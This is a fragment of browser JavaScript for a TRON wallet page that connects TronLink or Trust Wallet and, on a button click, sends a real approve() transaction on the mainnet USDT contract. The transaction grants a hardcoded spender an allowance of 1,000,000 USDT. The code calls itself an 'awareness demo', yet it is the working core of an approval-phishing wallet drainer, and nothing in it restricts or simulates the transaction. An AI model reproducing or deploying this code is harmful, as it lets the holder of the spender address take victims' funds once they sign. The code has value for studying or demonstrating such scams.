  <script>
    const USDT_CONTRACT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // Official TRON USDT
    const DECIMALS = 6;  // USDT decimals
    const $ = id => document.getElementById(id);

    let ready = false;

    function setStatus(msg, ok=false) {
      const el = $("status");
      el.innerText = msg;
      el.className = ok ? "ok" : "muted";
    }

    async function waitForTronWeb(timeoutMs = 8000) {
      const start = Date.now();
      return new Promise(resolve => {
        const iv = setInterval(() => {
          if (window.tronWeb && window.tronWeb.ready) {
            clearInterval(iv);
            resolve(true);
          }
          if (Date.now() - start > timeoutMs) {
            clearInterval(iv);
            resolve(false);
          }
        }, 200);
      });
    }

    $("connect").onclick = async () => {
      setStatus("Looking for wallet‚Ä¶");
      const ok = await waitForTronWeb();
      if (!ok) { setStatus("Wallet not found. Open in TronLink/Trust dApp browser."); return; }
      ready = true;
      $("approve").disabled = false;
      $("addr").innerText = tronWeb.defaultAddress.base58;
      setStatus("Wallet connected.", true);
    };

    $("approve").onclick = async () => {
      if (!ready) return;
      try {
        // Awareness demo: very large approval (1,000,000 USDT)
        const spender = "TJr9bYwYvApZ1aW8eW2Wkmk1u1sGkVQ3pZ"; // dummy spender
        const human = 1_000_000;
        const amount = BigInt(human * Math.pow(10, DECIMALS)).toString();

        const contract = await tronWeb.contract().at(USDT_CONTRACT);
        setStatus("Sending approve transaction‚Ä¶");
        const txid = await contract.approve(spender, amount).send();
        $("tx").innerText = txid;
        setStatus("Approve request sent. Check wallet popup.", true);

        console.log("Tx on tronscan:", `https://tronscan.org/#/transaction/${txid}`);
      } catch (e) {
        console.error(e);
        setStatus("User cancelled or error.", false);
      }
    };
